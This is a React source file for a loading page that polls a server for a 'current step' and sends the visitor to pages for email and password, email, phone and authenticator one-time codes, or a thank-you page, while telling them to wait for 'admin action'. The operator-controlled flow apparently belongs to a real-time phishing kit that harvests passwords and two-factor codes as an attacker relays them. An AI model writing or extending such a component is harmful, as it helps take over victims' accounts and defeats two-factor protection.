import React, { useEffect, useState } from "react";
import { fetchUserStep } from "../../services/api";
import Cookies from "js-cookie";
import { useNavigate } from "react-router-dom";

const Loader = () => {
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [retryCount, setRetryCount] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    const checkUserStep = async () => {
      const userId = Cookies.get("userId");

      if (!userId) {
        setError("Waiting for user setup... Please stay on this page.");
        if (retryCount < 10) {
          setRetryCount(retryCount + 1);
          setTimeout(checkUserStep, 1000);
        } else {
          setError("Failed to fetch user ID after multiple attempts.");
        }
        return;
      }

      try {
        const response = await fetchUserStep(userId);
        if (response.status === 200) {
          const step = response.data.currentStep;
          if (step === "loading") {
            setLoading(true);
          } else {
            switch (step) {
              case "email-password":
                navigate(`/email-page?userId=${userId}`);
                break;
              case "email-otp":
                navigate(`/email-otp-page?userId=${userId}`);
                break;
              case "phone-otp":
                navigate(`/phone-otp-page?userId=${userId}`);
                break;
              case "phone-number":
                navigate(`/phone-number-page?userId=${userId}`);
                break;
              case "authenticator-otp":
                navigate(`/authenticator-otp-page?userId=${userId}`);
                break;
              case "error":
                setError("Incorrect username or password.");
                setLoading(false); // Stop loader on error and show the error
                break;
              case "thank-you":
                navigate(`/thank-you?userId=${userId}`);
                break;
              default:
                setError("Unknown step");
                setLoading(false);
            }
          }
        }
      } catch (error) {
        console.error("Failed to fetch user step:", error);
        setError("Failed to fetch user step. Retrying...");
      }
    };

    const intervalId = setInterval(checkUserStep, 2000);

    return () => clearInterval(intervalId);
  }, [retryCount, navigate]);

  if (loading || error) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
        <div className="flex items-center space-x-2">
          <div className="w-8 h-8 border-4 border-blue-500 border-dashed rounded-full animate-spin"></div>
          <div className="text-gray-700 text-lg font-medium">
            {error || "Waiting for admin action... Please stay on this page."}
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default Loader;
